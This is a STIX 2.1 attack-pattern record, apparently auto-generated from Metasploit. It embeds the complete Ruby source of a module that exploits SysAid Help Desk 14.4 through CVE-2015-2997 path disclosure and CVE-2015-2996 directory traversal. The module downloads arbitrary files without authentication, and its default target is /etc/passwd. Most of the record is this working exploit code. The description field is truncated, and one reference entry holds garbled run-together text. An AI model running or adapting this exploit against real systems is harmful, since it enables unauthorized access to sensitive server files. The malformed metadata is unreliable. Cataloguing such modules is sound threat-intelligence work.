{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--987c5c13-6bd2-4fa1-abdd-ff8239c371b8",
    "created": "2024-08-14T16:23:43.75194Z",
    "modified": "2024-08-14T16:23:43.751944Z",
    "name": "SysAid Help Desk Arbitrary File Download",
    "description": " This module exploits two vulnerabilities in SysAid Help Desk that allows an unauthenticated user to download arbitrary files from the system. First, an",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/sysaid_file_download.rb",
            "external_id": "sysaid_file_download.rb"
        },
        {
            "source_name": "systempath",
            "external_id": "andthenweabuseadirectorytraversal(CVE-2015-2996)todownload"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2996"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2997"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jun/8"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SysAid Help Desk Arbitrary File Download',\n        'Description' => %q{\n          This module exploits two vulnerabilities in SysAid Help Desk that allows\n          an unauthenticated user to download arbitrary files from the system. First, an\n          information disclosure vulnerability (CVE-2015-2997) is used to obtain the file\n          system path, and then we abuse a directory traversal (CVE-2015-2996) to download\n          the file. Note that there are some limitations on Windows, in that the information\n          disclosure vulnerability doesn't work on a Windows platform, and we can only\n          traverse the current drive (if you enter C:\\afile.txt and the server is running\n          on D:\\ the file will not be downloaded).\n\n          This module has been tested with SysAid 14.4 on Windows and Linux.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2015-2996'],\n          ['CVE', '2015-2997'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Jun/8'],\n          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt'],\n        ],\n        'DisclosureDate' => '2015-06-03'\n      )\n    )\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 8080]),\n        OptString.new('TARGETURI', [ true, 'SysAid path', '/sysaid']),\n        OptString.new('FILEPATH', [false, 'Path of the file to download (escape Windows paths with a back slash)', '/etc/passwd']),\n      ]\n    )\n  end\n\n  def get_traversal_path\n    print_status('Trying to find out the traversal path...')\n    large_traversal = '../' * rand(15...30)\n    servlet_path = 'getAgentLogFile'\n\n    # We abuse getAgentLogFile to obtain the\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], servlet_path),\n      'method' => 'POST',\n      'data' => Zlib::Deflate.deflate(Rex::Text.rand_text_alphanumeric(rand(100) + rand(300))),\n      'ctype' => 'application/octet-stream',\n      'vars_get' => {\n        'accountId' => large_traversal + Rex::Text.rand_text_alphanumeric(rand(8..17)),\n        'computerId' => Rex::Text.rand_text_alphanumeric(rand(8..17))\n      }\n    })\n\n    if res && res.code == 200 && res.body.to_s =~ %r{<H2>(.*)</H2>}\n      error_path = ::Regexp.last_match(1)\n      # Error_path is something like:\n      # /var/lib/tomcat7/webapps/sysaid/./WEB-INF/agentLogs/../../../../../../../../../../ajkdnjhdfn/1421678611732.zip\n      # This calculates how much traversal we need to do to get to the root.\n      position = error_path.index(large_traversal)\n      unless position.nil?\n        return '../' * (error_path[0, position].count('/') - 2)\n      end\n    end\n  end\n\n  def download_file(download_path)\n    return send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(datastore['TARGETURI'], 'getGfiUpgradeFile'),\n      'vars_get' => {\n        'fileName' => download_path\n      }\n    })\n  rescue Rex::ConnectionRefused\n    print_error('Could not connect.')\n    return\n  end\n\n  def run\n    # No point to continue if filepath is not specified\n    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?\n      fail_with(Failure::BadConfig, 'Please supply the path of the file you want to download.')\n    end\n\n    print_status(\"Downloading file #{datastore['FILEPATH']}\")\n    if datastore['FILEPATH'] =~ /([A-Za-z]{1}):(\\\\*)(.*)/\n      file_path = ::Regexp.last_match(3)\n    else\n      file_path = datastore['FILEPATH']\n    end\n\n    traversal_path = get_traversal_path\n    if traversal_path.nil?\n      print_error('Could not get traversal path, using bruteforce to download the file')\n      count = 1\n      while count < 15\n        res = download_file(('../' * count) + file_path)\n        if res && res.code == 200 && res.body.to_s.bytesize != 0\n          break\n        end\n\n        count += 1\n      end\n    else\n      res = download_file(traversal_path[0, traversal_path.length - 1] + file_path)\n    end\n\n    if res && res.code == 200\n      if res.body.to_s.bytesize == 0\n        fail_with(Failure::NoAccess, \"#{peer} - 0 bytes returned, file does not exist or it is empty.\")\n      else\n        vprint_line(res.body.to_s)\n        fname = File.basename(datastore['FILEPATH'])\n\n        path = store_loot(\n          'sysaid.http',\n          'application/octet-stream',\n          datastore['RHOST'],\n          res.body,\n          fname\n        )\n        print_good(\"File saved in: #{path}\")\n      end\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to download file.\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-06-03"
}